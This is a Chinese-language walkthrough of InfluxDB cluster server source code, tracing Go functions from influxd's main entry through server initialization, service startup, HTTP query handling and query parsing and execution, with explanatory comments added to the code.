//初始化 m := NewMain() // Run if err := m.Run(os.Args[1:]...); err != nil &#123; fmt.Fprintln(os.Stderr, err) os.Exit(1) &#125;&#125; NewMain函数初始化一个实例 12345678// NewMain return a new instance of Main.func NewMain() *Main &#123; return &amp;Main&#123; Stdin: os.Stdin, Stdout: os.Stdout, Stderr: os.Stderr, &#125;&#125; 主要流程在Run函数中， 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// Run determines and runs the command specified by the CLI args.func (m *Main) Run(args ...string) error &#123; name, args := cmd.ParseCommandName(args) // Extract name from args. switch name &#123; case \"\", \"run\": // 默认执行流程 cmd := run.NewCommand() // Tell the server the build details. cmd.Version = version cmd.Commit = commit cmd.Branch = branch // 执行主要的函数 if err := cmd.Run(args...); err != nil &#123; return fmt.Errorf(\"run: %s\", err) &#125; //中断信号量 signalCh := make(chan os.Signal, 1) signal.Notify(signalCh, os.Interrupt, syscall.SIGTERM) cmd.Logger.Info(\"Listening for signals\") // Block until one of the signals above is received &lt;-signalCh cmd.Logger.Info(\"Signal received, initializing clean shutdown...\") go cmd.Close() // Block again until another signal is received, a shutdown timeout elapses, // or the Command is gracefully closed cmd.Logger.Info(\"Waiting for clean shutdown...\") select &#123; case &lt;-signalCh: cmd.Logger.Info(\"Second signal received, initializing hard shutdown\") case &lt;-time.After(time.Second * 30): cmd.Logger.Info(\"Time limit reached, initializing hard shutdown\") case &lt;-cmd.Closed: cmd.Logger.Info(\"Server shutdown completed\") &#125; // goodbye. case \"backup\": //备份 name := backup.NewCommand() if err := name.Run(args...); err != nil &#123; return fmt.Errorf(\"backup: %s\", err) &#125; case \"restore\": //恢复 name := restore.NewCommand() if err := name.Run(args...); err != nil &#123; return fmt.Errorf(\"restore: %s\", err) &#125; case \"config\": //打印当前配置 if err := run.NewPrintConfigCommand().Run(args...); err != nil &#123; return fmt.Errorf(\"config: %s\", err) &#125; case \"version\": if err := NewVersionCommand().Run(args...); err != nil &#123; return fmt.Errorf(\"version: %s\", err) &#125; case \"help\": if err := help.NewCommand().Run(args...); err != nil &#123; return fmt.Errorf(\"help: %s\", err) &#125; default: return fmt.Errorf(`unknown command \"%s\"`+\"\\n\"+`Run 'influxd help' for usage`+\"\\n\\n\", name) &#125; return nil&#125; 先分析run部分： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118// Run parses the config from args and runs the server.func (cmd *Command) Run(args ...string) error &#123; // Parse the command line flags. options, err := cmd.ParseFlags(args...) if err != nil &#123; return err &#125; //解析配置文件 config, err := cmd.ParseConfig(options.GetConfigPath()) if err != nil &#123; return fmt.Errorf(\"parse config: %s\", err) &#125; // Apply any environment variables on top of the parsed config if err := config.ApplyEnvOverrides(cmd.Getenv); err != nil &#123; return fmt.Errorf(\"apply env config: %v\", err) &#125; // Propogate the top-level join options down to the meta config //解析join的集群环境下的iplist if config.Join != \"\" &#123; config.Meta.JoinPeers = strings.Split(config.Join, \",\") &#125; // Command-line flags for -join and -hostname override the config // and env variable if options.Join != \"\" &#123; config.Meta.JoinPeers = strings.Split(options.Join, \",\") &#125; // 解析本地hostname if options.Hostname != \"\" &#123; config.Hostname = options.Hostname &#125; // Propogate the top-level hostname down to dependendent configs config.Meta.RemoteHostname = config.Hostname // Validate the configuration. // 检查各个配置是否为空 if err := config.Validate(); err != nil &#123; return fmt.Errorf(\"%s. To generate a valid configuration file run `influxd config &gt; influxdb.generated.conf`\", err) &#125; var logErr error if cmd.Logger, logErr = config.Logging.New(cmd.Stderr); logErr != nil &#123; // assign the default logger cmd.Logger = logger.New(cmd.Stderr) &#125; // Attempt to run pprof on :6060 before startup if debug pprof enabled. //是否开启pprof if config.HTTPD.DebugPprofEnabled &#123; runtime.SetBlockProfileRate(int(1 * time.Second)) runtime.SetMutexProfileFraction(1) go func() &#123; http.ListenAndServe(\"localhost:6060\", nil) &#125;() &#125; // Print sweet InfluxDB logo. // 打印logo if !config.Logging.SuppressLogo &amp;&amp; logger.IsTerminal(cmd.Stdout) &#123; fmt.Fprint(cmd.Stdout, logo) &#125; // Mark start-up in log. cmd.Logger.Info(\"InfluxDB starting\", zap.String(\"version\", cmd.Version), zap.String(\"branch\", cmd.Branch), zap.String(\"commit\", cmd.Commit)) cmd.Logger.Info(\"Go runtime\", zap.String(\"version\", runtime.Version()), zap.Int(\"maxprocs\", runtime.GOMAXPROCS(0))) // If there was an error on startup when creating the logger, output it now. if logErr != nil &#123; cmd.Logger.Error(\"Unable to configure logger\", zap.Error(logErr)) &#125; // Write the PID file. // 写入pid文件 if err := cmd.writePIDFile(options.PIDFile); err != nil &#123; return fmt.Errorf(\"write pid file: %s\", err) &#125; cmd.pidfile = options.PIDFile if config.HTTPD.PprofEnabled &#123; // Turn on block and mutex profiling. runtime.SetBlockProfileRate(int(1 * time.Second)) runtime.SetMutexProfileFraction(1) // Collect every sample &#125; // Create server from config and start it. // 初始化服务器 buildInfo := &amp;BuildInfo&#123; Version: cmd.Version, Commit: cmd.Commit, Branch: cmd.Branch, Time: cmd.BuildTime, &#125; s, err := NewServer(config, buildInfo) if err != nil &#123; return fmt.Errorf(\"create server: %s\", err) &#125; s.Logger = cmd.Logger s.CPUProfile = options.CPUProfile s.MemProfile = options.MemProfile // 启动 if err := s.Open(); err != nil &#123; return fmt.Errorf(\"open server: %s\", err) &#125; cmd.Server = s // Begin monitoring the server's error channel. go cmd.monitorServerErrors() return nil&#125; 初始化函数NewServer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165// NewServer returns a new instance of Server built from a config.func NewServer(c *Config, buildInfo *BuildInfo) (*Server, error) &#123; // We need to ensure that a meta directory always exists even if // we don't start the meta store. node.json is always stored under // the meta directory. // 建立元数据目录，并加权 if err := os.MkdirAll(c.Meta.Dir, 0777); err != nil &#123; return nil, fmt.Errorf(\"mkdir all: %s\", err) &#125; // 0.10-rc1 and prior would sometimes put the node.json at the root // dir which breaks backup/restore and restarting nodes. This moves // the file from the root so it's always under the meta dir. //移动和恢复节点信息 oldPath := filepath.Join(filepath.Dir(c.Meta.Dir), \"node.json\") newPath := filepath.Join(c.Meta.Dir, \"node.json\") //修改 if _, err := os.Stat(oldPath); err == nil &#123; if err := os.Rename(oldPath, newPath); err != nil &#123; return nil, err &#125; &#125;// 从磁盘中加载节点信息 node, err := influxdb.LoadNode(c.Meta.Dir) if err != nil &#123; if !os.IsNotExist(err) &#123; return nil, err &#125; //不存在则新建 node = influxdb.NewNode(c.Meta.Dir) &#125; //if err := raftDBExists(c.Meta.Dir); err != nil &#123; // return nil, err //&#125; // In 0.10.0 bind-address got moved to the top level. Check // The old location to keep things backwards compatible bind := c.BindAddress if c.Meta.BindAddress != \"\" &#123; bind = c.Meta.BindAddress &#125; //判断元数据是否打开 if !c.Data.Enabled &amp;&amp; !c.Meta.Enabled &#123; return nil, fmt.Errorf(\"must run as either meta node or data node or both\") &#125; //初始化 s := &amp;Server&#123; buildInfo: *buildInfo, err: make(chan error), closing: make(chan struct&#123;&#125;), Node: node, BindAddress: bind, Logger: logger.New(os.Stderr), //MetaClient: meta.NewClient(c.Meta), MetaClient: meta.NewClient(), reportingDisabled: c.ReportingDisabled, joinPeers: c.Meta.JoinPeers, metaUseTLS: c.Meta.HTTPSEnabled, httpAPIAddr: c.HTTPD.BindAddress, // http服务bind地址 httpUseTLS: c.HTTPD.HTTPSEnabled, //https打开 tcpAddr: bind, config: c, &#125; //初始化元数据服务 if c.Meta.Enabled &#123; s.MetaService = meta.NewService(c.Meta) s.MetaService.Version = s.buildInfo.Version s.MetaService.Node = s.Node &#125; if c.AdminCluster.Enabled &#123; s.AdminClusterService = admin_cluster.NewService(c.AdminCluster) s.AdminClusterService.Version = s.buildInfo.Version s.AdminClusterService.Handler.MetaClient = s.MetaClient s.AdminClusterService.TCPHandler.MetaClient = s.MetaClient s.AdminClusterService.TCPHandler.Server = s &#125; //初始化监控信息 s.Monitor = monitor.New(s, c.Monitor) s.config.registerDiagnostics(s.Monitor) if c.Data.Enabled &#123; //初始化tsdb s.TSDBStore = tsdb.NewStore(c.Data.Dir) s.TSDBStore.EngineOptions.Config = c.Data s.AdminClusterService.TCPHandler.TSDBStore = s.TSDBStore // Copy TSDB configuration. s.TSDBStore.EngineOptions.EngineVersion = c.Data.Engine s.TSDBStore.EngineOptions.IndexVersion = c.Data.Index // Create the Subscriber service s.Subscriber = subscriber.NewService(c.Subscriber) // Set the shard writer s.ShardWriter = cluster.NewShardWriter(time.Duration(c.Cluster.ShardWriterTimeout), c.Cluster.MaxRemoteWriteConnections) // Create the hinted handoff service s.HintedHandoff = hh.NewService(c.HintedHandoff, s.ShardWriter, s.MetaClient) s.HintedHandoff.Monitor = s.Monitor // Initialize points writer. s.PointsWriter = cluster.NewPointsWriter() s.PointsWriter.WriteTimeout = time.Duration(c.Coordinator.WriteTimeout) s.PointsWriter.TSDBStore = s.TSDBStore s.PointsWriter.ShardWriter = s.ShardWriter s.PointsWriter.HintedHandoff = s.HintedHandoff s.PointsWriter.Node = s.Node // Initialize meta executor. metaExecutor := cluster.NewMetaExecutor() metaExecutor.MetaClient = s.MetaClient metaExecutor.Node = s.Node // Initialize query executor. // 初始化查询 s.QueryExecutor = query.NewExecutor() //初始化集群存储分片 clusterShardMapper := &amp;cluster.ClusterShardMapper&#123; MetaClient: s.MetaClient, TSDBStore: coordinator.LocalTSDBStore&#123;Store: s.TSDBStore&#125;, LocalShardMapper: &amp;coordinator.LocalShardMapper&#123; MetaClient: s.MetaClient, TSDBStore: coordinator.LocalTSDBStore&#123;Store: s.TSDBStore&#125;, &#125;, Node: s.Node, ShardMapperTimeout: time.Duration(s.config.Cluster.ShardMapperTimeout), &#125; clusterShardMapper.WithLogger(s.Logger) //初始化执行 //设置最大的查询范围和bucket数目等 s.QueryExecutor.StatementExecutor = &amp;cluster.StatementExecutor&#123; MetaClient: s.MetaClient, TaskManager: s.QueryExecutor.TaskManager, TSDBStore: s.TSDBStore, ShardMapper: clusterShardMapper, Monitor: s.Monitor, PointsWriter: s.PointsWriter, MaxSelectPointN: c.Coordinator.MaxSelectPointN, MaxSelectSeriesN: c.Coordinator.MaxSelectSeriesN, MaxSelectBucketsN: c.Coordinator.MaxSelectBucketsN, MetaExecutor: metaExecutor, &#125; s.QueryExecutor.TaskManager.QueryTimeout = time.Duration(c.Coordinator.QueryTimeout) s.QueryExecutor.TaskManager.LogQueriesAfter = time.Duration(c.Coordinator.LogQueriesAfter) s.QueryExecutor.TaskManager.MaxConcurrentQueries = c.Coordinator.MaxConcurrentQueries // Initialize the monitor s.Monitor.Version = s.buildInfo.Version s.Monitor.Commit = s.buildInfo.Commit s.Monitor.Branch = s.buildInfo.Branch s.Monitor.BuildTime = s.buildInfo.Time s.Monitor.PointsWriter = (*monitorPointsWriter)(s.PointsWriter) &#125; return s, nil&#125; open启动服务： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// Open opens the meta and data store and all services.func (s *Server) Open() error &#123; // Start profiling, if set. // linux profile startProfile(s.CPUProfile, s.MemProfile) // Open shared TCP connection. // 启动tcp连接 ln, err := net.Listen(\"tcp\", s.BindAddress) if err != nil &#123; return fmt.Errorf(\"listen: %s\", err) &#125; s.Listener = ln // Multiplex listener. // 启动多路复用器 mux := tcp.NewMux() s.Mux = mux go mux.Serve(ln) if s.MetaService != nil &#123; //元数据服务raftlistener初始化 s.MetaService.RaftListener = mux.Listen(meta.MuxHeader) // Configure logging for all services and clients. if s.config.Meta.LoggingEnabled &#123; s.MetaService.WithLogger(s.Logger) &#125; // Open meta service. //元数据服务启动 if err := s.MetaService.Open(); err != nil &#123; return fmt.Errorf(\"open meta service: %s\", err) &#125; go s.monitorErrorChan(s.MetaService.Err()) &#125; if s.AdminClusterService != nil &#123; // Configure logging for all services and clients. if s.config.AdminCluster.ClusterTracing &#123; s.AdminClusterService.WithLogger(s.Logger) &#125; // TCP listen s.AdminClusterService.TCPHandler.Listener = s.Mux.Listen(admin_cluster.MuxHeader) // Open admin cluster service. //启动集群admin_cluster服务 if err := s.AdminClusterService.Open(); err != nil &#123; return fmt.Errorf(\"open admin cluster service: %s\", err) &#125; &#125; // initialize MetaClient. //初始化元数据客户端，用于设置集群功能，加入集群等功能。 if err = s.initializeMetaClient(); err != nil &#123; return err &#125; // Start the reporting service, if not disabled. //if !s.reportingDisabled &#123; // go s.startServerReporting() //&#125; return nil&#125; initializeMetaClient函数中： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// initializeMetaClient will set the MetaClient and join the node to the cluster if neededfunc (s *Server) initializeMetaClient() error &#123; // It's the first time starting up and we need to either join // the cluster or initialize this node as the first member //如果每天joinpeers，则返回 if len(s.joinPeers) == 0 &#123; // start up a new single node cluster if s.MetaService == nil &#123; return fmt.Errorf(\"server not set to join existing cluster must run also as a meta node\") &#125; s.MetaClient.SetMetaServers([]string&#123;s.MetaService.HTTPAddr()&#125;) s.MetaClient.SetTLS(s.metaUseTLS) &#125; else &#123; var err error var joinPeers []string if s.MetaService != nil &#123; raddr := s.remoteAddr(s.MetaService.HTTPAddr()) joinPeers, err = s.filterAddr(s.joinPeers, raddr) if err != nil &#123; return err &#125; &#125; else &#123; joinPeers = s.joinPeers &#125; s.MetaClient.SetMetaServers(joinPeers) s.MetaClient.SetTLS(s.metaUseTLS) &#125; //打开client if err := s.MetaClient.Open(); err != nil &#123; return err &#125; // if the node ID is &gt; 0 then we need to initialize the metaclient if s.Node.GetMetaID() &gt; 0 || s.Node.GetDataID() &gt; 0 &#123; s.MetaClient.WaitForDataChanged() &#125; if len(s.joinPeers) &gt; 0 &#123; s.MetaClient.SetMetaServers(s.joinPeers) &#125; if s.config.Data.Enabled &#123; go func() &#123; t := time.NewTicker(time.Second) for &#123; select &#123; case &lt;-t.C: //定时器服务，检查是否打开数据服务 if _, err := s.MetaClient.DataNode(s.Node.GetDataID()); err == nil &#123; oerr := s.OpenDataServer() if oerr != nil &#123; s.Logger.Error(\"failed to open data server.\", zap.Error(oerr)) panic(\"open data server failed\") &#125; s.Logger.Info(\"data server started\", zap.Uint64(\"node id\", s.Node.GetDataID())) return &#125; case &lt;-s.closing: return &#125; &#125; &#125;() &#125; return nil&#125; 如果找到数据节点，则启动opendataServer函数，启动数据服务： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596func (s *Server) OpenDataServer() error &#123; if s.TSDBStore != nil &amp;&amp; !s.DataServicesOpened &#123; s.DataServicesOpened = true // Append services. // 启动集群服务，初始化所有的服务 s.appendClusterService(s.config.Cluster) s.appendMonitorService() s.appendPrecreatorService(s.config.Precreator) s.appendSnapshotterService() s.appendContinuousQueryService(s.config.ContinuousQuery) s.appendAntiEntropyService(s.config.AntiEntropy) // http服务 s.appendHTTPDService(s.config.HTTPD) s.appendStorageService(s.config.Storage) //RetentionPolicy s.appendRetentionPolicyService(s.config.Retention) for _, i := range s.config.GraphiteInputs &#123; if err := s.appendGraphiteService(i); err != nil &#123; return err &#125; &#125; for _, i := range s.config.CollectdInputs &#123; s.appendCollectdService(i) &#125; for _, i := range s.config.OpenTSDBInputs &#123; if err := s.appendOpenTSDBService(i); err != nil &#123; return err &#125; &#125; for _, i := range s.config.UDPInputs &#123; s.appendUDPService(i) &#125; s.Subscriber.MetaClient = s.MetaClient s.PointsWriter.MetaClient = s.MetaClient s.Monitor.MetaClient = s.MetaClient s.ShardWriter.MetaClient = s.MetaClient s.HintedHandoff.MetaClient = s.MetaClient s.ClusterService.Listener = s.Mux.Listen(cluster.MuxHeader) s.SnapshotterService.Listener = s.Mux.Listen(snapshotter.MuxHeader) // Configure logging for all services and clients. if s.config.Meta.LoggingEnabled &#123; s.MetaClient.WithLogger(s.Logger) &#125; s.TSDBStore.WithLogger(s.Logger) if s.config.Data.QueryLogEnabled &#123; s.QueryExecutor.WithLogger(s.Logger) &#125; s.PointsWriter.WithLogger(s.Logger) s.Subscriber.WithLogger(s.Logger) s.HintedHandoff.WithLogger(s.Logger) for _, svc := range s.Services &#123; svc.WithLogger(s.Logger) &#125; s.SnapshotterService.WithLogger(s.Logger) s.Monitor.WithLogger(s.Logger) // Open TSDB store. // tsdb启动 if err := s.TSDBStore.Open(); err != nil &#123; return fmt.Errorf(\"open tsdb store: %s\", err) &#125; // Open the hinted handoff service if err := s.HintedHandoff.Open(); err != nil &#123; return fmt.Errorf(\"open hinted handoff: %s\", err) &#125; // Open the subscriber service if err := s.Subscriber.Open(); err != nil &#123; return fmt.Errorf(\"open subscriber: %s\", err) &#125; // Open the points writer service if err := s.PointsWriter.Open(); err != nil &#123; return fmt.Errorf(\"open points writer: %s\", err) &#125; s.PointsWriter.AddWriteSubscriber(s.Subscriber.Points()) for _, service := range s.Services &#123; //将注册的服务都启动起来，这边调用每个服务的open方法启动起来 if err := service.Open(); err != nil &#123; return fmt.Errorf(\"open service: %s\", err) &#125; &#125; return nil &#125; if s.TSDBStore == nil &#123; return fmt.Errorf(\"Data server is not enabled\") &#125; return nil&#125; 服务主要有下面这些： 123456789101112131415clustermonitorprecreatorsnapshottercontinuousqueryantientropyhttpstorageretentionpolicygraphitecollectdopentsdbudphhmeta 每个服务都有open函数，分别启动。 举例来说： http服务初始化函数NewService: 123456789101112131415161718192021222324// NewService returns a new instance of Service.func NewService(c Config) *Service &#123; s := &amp;Service&#123; addr: c.BindAddress, https: c.HTTPSEnabled, cert: c.HTTPSCertificate, key: c.HTTPSPrivateKey, limit: c.MaxConnectionLimit, err: make(chan error), unixSocket: c.UnixSocketEnabled, unixSocketPerm: uint32(c.UnixSocketPermissions), bindSocket: c.BindSocket, Handler: NewHandler(c), //服务启动处理函数 Logger: zap.NewNop(), &#125; if s.key == \"\" &#123; s.key = s.cert &#125; if c.UnixSocketGroup != nil &#123; s.unixSocketGroup = int(*c.UnixSocketGroup) &#125; s.Handler.Logger = s.Logger return s&#125; handler函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243func NewHandler(c Config) *Handler &#123; h := &amp;Handler&#123; mux: pat.New(), Config: &amp;c, Logger: zap.NewNop(), CLFLogger: log.New(os.Stderr, \"[httpd] \", 0), Store: storage.NewStore(), stats: &amp;Statistics&#123;&#125;, requestTracker: NewRequestTracker(), sema: make(chan struct&#123;&#125;, 100), &#125; // Limit the number of concurrent &amp; enqueued write requests. h.writeThrottler = NewThrottler(c.MaxConcurrentWriteLimit, c.MaxEnqueuedWriteLimit) h.writeThrottler.EnqueueTimeout = c.EnqueuedWriteTimeout // Disable the write log if they have been suppressed. writeLogEnabled := c.LogEnabled if c.SuppressWriteLog &#123; writeLogEnabled = false &#125; //所有服务查询的入口函数在这边处理 h.AddRoutes([]Route&#123; Route&#123; \"query-options\", // Satisfy CORS checks. \"OPTIONS\", \"/query\", false, true, h.serveOptions, &#125;, Route&#123; \"query\", // Query serving route. \"GET\", \"/query\", true, true, h.serveQuery, &#125;, Route&#123; \"query\", // Query serving route. \"POST\", \"/query\", true, true, h.serveQuery, &#125;, Route&#123; .... \"GET\", \"/metrics\", false, true, promhttp.Handler().ServeHTTP, &#125;, &#125;...) return h&#125; 查询函数serveQuery； 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291// serveQuery parses an incoming query and, if valid, executes the query.func (h *Handler) serveQuery(w http.ResponseWriter, r *http.Request, user meta.User) &#123; atomic.AddInt64(&amp;h.stats.QueryRequests, 1) defer func(start time.Time) &#123; atomic.AddInt64(&amp;h.stats.QueryRequestDuration, time.Since(start).Nanoseconds()) &#125;(time.Now()) h.requestTracker.Add(r, user) // Retrieve the underlying ResponseWriter or initialize our own. rw, ok := w.(ResponseWriter) if !ok &#123; rw = NewResponseWriter(w, r) &#125; // Retrieve the node id the query should be executed on. nodeID, _ := strconv.ParseUint(r.FormValue(\"node_id\"), 10, 64) var qr io.Reader // Attempt to read the form value from the \"q\" form value. if qp := strings.TrimSpace(r.FormValue(\"q\")); qp != \"\" &#123; qr = strings.NewReader(qp) &#125; else if r.MultipartForm != nil &amp;&amp; r.MultipartForm.File != nil &#123; // If we have a multipart/form-data, try to retrieve a file from 'q'. if fhs := r.MultipartForm.File[\"q\"]; len(fhs) &gt; 0 &#123; f, err := fhs[0].Open() if err != nil &#123; h.httpError(rw, err.Error(), http.StatusBadRequest) return &#125; defer f.Close() qr = f &#125; &#125; if qr == nil &#123; h.httpError(rw, `missing required parameter \"q\"`, http.StatusBadRequest) return &#125; epoch := strings.TrimSpace(r.FormValue(\"epoch\")) // 初始化查询解析器 p := influxql.NewParser(qr) db := r.FormValue(\"db\") // Sanitize the request query params so it doesn't show up in the response logger. // Do this before anything else so a parsing error doesn't leak passwords. sanitize(r) // Parse the parameters rawParams := r.FormValue(\"params\") if rawParams != \"\" &#123; var params map[string]interface&#123;&#125; decoder := json.NewDecoder(strings.NewReader(rawParams)) decoder.UseNumber() if err := decoder.Decode(&amp;params); err != nil &#123; h.httpError(rw, \"error parsing query parameters: \"+err.Error(), http.StatusBadRequest) return &#125; // Convert json.Number into int64 and float64 values for k, v := range params &#123; if v, ok := v.(json.Number); ok &#123; var err error if strings.Contains(string(v), \".\") &#123; params[k], err = v.Float64() &#125; else &#123; params[k], err = v.Int64() &#125; if err != nil &#123; h.httpError(rw, \"error parsing json value: \"+err.Error(), http.StatusBadRequest) return &#125; &#125; &#125; p.SetParams(params) &#125; // Parse query from query string. //开始解析query查询语句 q, err := p.ParseQuery() if err != nil &#123; h.httpError(rw, \"error parsing query: \"+err.Error(), http.StatusBadRequest) return &#125; // Check authorization. //检查认证信息 if h.Config.AuthEnabled &#123; if err := h.QueryAuthorizer.AuthorizeQuery(user, q, db); err != nil &#123; if err, ok := err.(meta.ErrAuthorize); ok &#123; h.Logger.Info(\"Unauthorized request\", zap.String(\"user\", err.User), zap.Stringer(\"query\", err.Query), logger.Database(err.Database)) &#125; h.httpError(rw, \"error authorizing query: \"+err.Error(), http.StatusForbidden) return &#125; &#125; // Parse chunk size. Use default if not provided or unparsable. chunked := r.FormValue(\"chunked\") == \"true\" chunkSize := DefaultChunkSize if chunked &#123; if n, err := strconv.ParseInt(r.FormValue(\"chunk_size\"), 10, 64); err == nil &amp;&amp; int(n) &gt; 0 &#123; chunkSize = int(n) &#125; &#125; // Parse whether this is an async command. async := r.FormValue(\"async\") == \"true\"//参数实例化 opts := query.ExecutionOptions&#123; Database: db, RetentionPolicy: r.FormValue(\"rp\"), ChunkSize: chunkSize, ReadOnly: r.Method == \"GET\", NodeID: nodeID, &#125; if h.Config.AuthEnabled &#123; // The current user determines the authorized actions. opts.Authorizer = user &#125; else &#123; // Auth is disabled, so allow everything. opts.Authorizer = query.OpenAuthorizer &#125; // Make sure if the client disconnects we signal the query to abort var closing chan struct&#123;&#125; if !async &#123; closing = make(chan struct&#123;&#125;) if notifier, ok := w.(http.CloseNotifier); ok &#123; // CloseNotify() is not guaranteed to send a notification when the query // is closed. Use this channel to signal that the query is finished to // prevent lingering goroutines that may be stuck. done := make(chan struct&#123;&#125;) defer close(done) notify := notifier.CloseNotify() go func() &#123; // Wait for either the request to finish // or for the client to disconnect select &#123; case &lt;-done: case &lt;-notify: close(closing) &#125; &#125;() opts.AbortCh = done &#125; else &#123; defer close(closing) &#125; &#125; // Execute query. //执行查询语句 results := h.QueryExecutor.ExecuteQuery(q, opts, closing) // If we are running in async mode, open a goroutine to drain the results // and return with a StatusNoContent. if async &#123; go h.async(q, results) h.writeHeader(w, http.StatusNoContent) return &#125; // if we're not chunking, this will be the in memory buffer for all results before sending to client resp := Response&#123;Results: make([]*query.Result, 0)&#125; // Status header is OK once this point is reached. // Attempt to flush the header immediately so the client gets the header information // and knows the query was accepted. h.writeHeader(rw, http.StatusOK) if w, ok := w.(http.Flusher); ok &#123; w.Flush() &#125; // pull all results from the channel rows := 0 for r := range results &#123; // Ignore nil results. if r == nil &#123; continue &#125; // if requested, convert result timestamps to epoch if epoch != \"\" &#123; convertToEpoch(r, epoch) &#125; // Write out result immediately if chunked. if chunked &#123; n, _ := rw.WriteResponse(Response&#123; Results: []*query.Result&#123;r&#125;, &#125;) atomic.AddInt64(&amp;h.stats.QueryRequestBytesTransmitted, int64(n)) w.(http.Flusher).Flush() continue &#125; // Limit the number of rows that can be returned in a non-chunked // response. This is to prevent the server from going OOM when // returning a large response. If you want to return more than the // default chunk size, then use chunking to process multiple blobs. // Iterate through the series in this result to count the rows and // truncate any rows we shouldn't return. //最大限制数目 if h.Config.MaxRowLimit &gt; 0 &#123; for i, series := range r.Series &#123; n := h.Config.MaxRowLimit - rows if n &lt; len(series.Values) &#123; // We have reached the maximum number of values. Truncate // the values within this row. series.Values = series.Values[:n] // Since this was truncated, it will always be a partial return. // Add this so the client knows we truncated the response. series.Partial = true &#125; rows += len(series.Values) if rows &gt;= h.Config.MaxRowLimit &#123; // Drop any remaining series since we have already reached the row limit. if i &lt; len(r.Series) &#123; r.Series = r.Series[:i+1] &#125; break &#125; &#125; &#125; // It's not chunked so buffer results in memory. // Results for statements need to be combined together. // We need to check if this new result is for the same statement as // the last result, or for the next statement l := len(resp.Results) if l == 0 &#123; resp.Results = append(resp.Results, r) &#125; else if resp.Results[l-1].StatementID == r.StatementID &#123; if r.Err != nil &#123; resp.Results[l-1] = r continue &#125; cr := resp.Results[l-1] rowsMerged := 0 if len(cr.Series) &gt; 0 &#123; lastSeries := cr.Series[len(cr.Series)-1] for _, row := range r.Series &#123; if !lastSeries.SameSeries(row) &#123; // Next row is for a different series than last. break &#125; // Values are for the same series, so append them. lastSeries.Values = append(lastSeries.Values, row.Values...) rowsMerged++ &#125; &#125; // Append remaining rows as new rows. r.Series = r.Series[rowsMerged:] cr.Series = append(cr.Series, r.Series...) cr.Messages = append(cr.Messages, r.Messages...) cr.Partial = r.Partial &#125; else &#123; resp.Results = append(resp.Results, r) &#125; // Drop out of this loop and do not process further results when we hit the row limit. if h.Config.MaxRowLimit &gt; 0 &amp;&amp; rows &gt;= h.Config.MaxRowLimit &#123; // If the result is marked as partial, remove that partial marking // here. While the series is partial and we would normally have // tried to return the rest in the next chunk, we are not using // chunking and are truncating the series so we don't want to // signal to the client that we plan on sending another JSON blob // with another result. The series, on the other hand, still // returns partial true if it was truncated or had more data to // send in a future chunk. r.Partial = false break &#125; &#125; // If it's not chunked we buffered everything in memory, so write it out if !chunked &#123; n, _ := rw.WriteResponse(resp) atomic.AddInt64(&amp;h.stats.QueryRequestBytesTransmitted, int64(n)) &#125;&#125; 函数ParseQuery函数解析query： 123456789101112131415161718192021222324// ParseQuery parses an InfluxQL string and returns a Query AST object.func (p *Parser) ParseQuery() (*Query, error) &#123; var statements Statements semi := true for &#123; if tok, pos, lit := p.ScanIgnoreWhitespace(); tok == EOF &#123;//如果tok==EOF的时候，正常解析完成返回; return &amp;Query&#123;Statements: statements&#125;, nil &#125; else if tok == SEMICOLON &#123; semi = true &#125; else &#123; if !semi &#123; return nil, newParseError(tokstr(tok, lit), []string&#123;\";\"&#125;, pos) &#125; p.Unscan() s, err := p.ParseStatement() //解析词 if err != nil &#123; return nil, err &#125; statements = append(statements, s) //返回解析的statments semi = false &#125; &#125;&#125; 执行解析的executeQuery函数： 123456// ExecuteQuery executes each statement within a query.func (e *Executor) ExecuteQuery(query *influxql.Query, opt ExecutionOptions, closing chan struct&#123;&#125;) &lt;-chan *Result &#123; results := make(chan *Result) go e.executeQuery(query, opt, closing, results) //执行查询语句 return results&#125; 调用executeQuery函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139func (e *Executor) executeQuery(query *influxql.Query, opt ExecutionOptions, closing &lt;-chan struct&#123;&#125;, results chan *Result) &#123; defer close(results) defer e.recover(query, results) atomic.AddInt64(&amp;e.stats.ActiveQueries, 1) atomic.AddInt64(&amp;e.stats.ExecutedQueries, 1) defer func(start time.Time) &#123; atomic.AddInt64(&amp;e.stats.ActiveQueries, -1) atomic.AddInt64(&amp;e.stats.FinishedQueries, 1) atomic.AddInt64(&amp;e.stats.QueryExecutionDuration, time.Since(start).Nanoseconds()) &#125;(time.Now())// 使用taskManager来管理查询query,返回一个channel，当query完成running的时候。 ctx, detach, err := e.TaskManager.AttachQuery(query, opt, closing) if err != nil &#123; select &#123; case results &lt;- &amp;Result&#123;Err: err&#125;: case &lt;-opt.AbortCh: &#125; return &#125; defer detach() // Setup the execution context that will be used when executing statements. ctx.Results = results var i intLOOP: for ; i &lt; len(query.Statements); i++ &#123; ctx.statementID = i stmt := query.Statements[i] // If a default database wasn't passed in by the caller, check the statement. defaultDB := opt.Database if defaultDB == \"\" &#123; if s, ok := stmt.(influxql.HasDefaultDatabase); ok &#123; defaultDB = s.DefaultDatabase() &#125; &#125; // Do not let queries manually use the system measurements. If we find // one, return an error. This prevents a person from using the // measurement incorrectly and causing a panic. if stmt, ok := 